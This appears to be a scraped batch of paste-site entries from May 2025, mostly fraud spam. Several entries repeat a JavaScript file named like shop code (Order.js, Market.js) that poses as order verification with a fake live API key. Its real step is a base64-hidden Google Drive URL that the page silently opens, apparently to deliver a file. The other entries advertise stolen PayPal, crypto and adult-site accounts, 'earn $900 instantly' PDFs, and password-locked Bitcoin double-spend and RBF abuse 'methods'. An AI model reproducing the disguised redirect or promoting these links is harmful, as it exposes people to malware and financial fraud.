id,title,username,language,date,content
9xeVVs2B,Products.js,hubertzoo90,JavaScript,Sunday 4th of May 2025 07:05:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/77544/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
apcDEUnC,EARN $900 INSTANTLY 2025⭐ GV,UKnoDatBoi,JavaScript,Sunday 4th of May 2025 06:59:49 PM CDT," 
Pdf https://tinyurl.com/freshleaks

V65rHLizzH
"
sjGUWyQ2,Make $1000 15-MINUTES  (BEGINNER) YR,UKnoDatBoi,JavaScript,Sunday 4th of May 2025 06:50:35 PM CDT," 
Pdf https://tinyurl.com/freshleaks

gX28MOMnk4
"
rntRCyMj,Chaturbate with Tokens,jm33,JavaScript,Sunday 4th of May 2025 06:50:26 PM CDT,05720 Accounts Posted On https://t.me/leakzbyeminem
sqT8LryT,Doublespending using Vanity Wallet,zebmekey,JavaScript,Sunday 4th of May 2025 06:50:18 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 28707
cT7m2taA,Order.js,hubertzoo90,JavaScript,Sunday 4th of May 2025 06:50:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/30912/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
G75iCBn3,EARN $900 INSTANTLY 2025 95,UKnoDatBoi,JavaScript,Sunday 4th of May 2025 06:41:21 PM CDT," 
Pdf https://tinyurl.com/freshleaks

lIs9zgS008
"
UrbGgQP1,Crypto Accounts,jm33,JavaScript,Sunday 4th of May 2025 06:34:59 PM CDT,05003 Accounts Posted On https://t.me/leakzbyeminem
c2eHDnNB,Abuse RBF in BTC transactions,zebmekey,JavaScript,Sunday 4th of May 2025 06:34:56 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 56993
PbH2WJRh,Market.js,hubertzoo90,JavaScript,Sunday 4th of May 2025 06:34:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/35591/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zB2VmSGk,Make $1000 15-MINUTES  (BEGINNER) YR,New10ten,JavaScript,Sunday 4th of May 2025 06:31:50 PM CDT," 
Pdf https://tinyurl.com/freshleaks

UfQZGShyaX
"
pmtuK6Gh,PayPal with Balance,jm33,JavaScript,Sunday 4th of May 2025 06:19:36 PM CDT,34238 Accounts Posted On https://t.me/leakzbyeminem
PaTkDP6F,Stake Free Balance Method,zebmekey,JavaScript,Sunday 4th of May 2025 06:19:35 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 98424
iY9DkUsr,Untitled,hubertzoo90,JavaScript,Sunday 4th of May 2025 06:19:32 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40567/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HbkE8nZw,Market.js,jm33,JavaScript,Sunday 4th of May 2025 05:59:20 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15270/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nhhCvLEv,Crypto Accounts,zebmekey,JavaScript,Sunday 4th of May 2025 05:59:19 PM CDT,76291 Accounts Posted On https://t.me/leakzbyeminem
BdfXEv8v,Abuse RBF in BTC transactions,SpawnKz,JavaScript,Sunday 4th of May 2025 05:59:18 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 26231
HAGSA0sa,Untitled,jm33,JavaScript,Sunday 4th of May 2025 05:43:58 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/73320/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hUwNnxnJ,PayPal with Balance,zebmekey,JavaScript,Sunday 4th of May 2025 05:43:57 PM CDT,68922 Accounts Posted On https://t.me/leakzbyeminem
jEBS4RRs,Stake Free Balance Method,SpawnKz,JavaScript,Sunday 4th of May 2025 05:43:57 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 18761
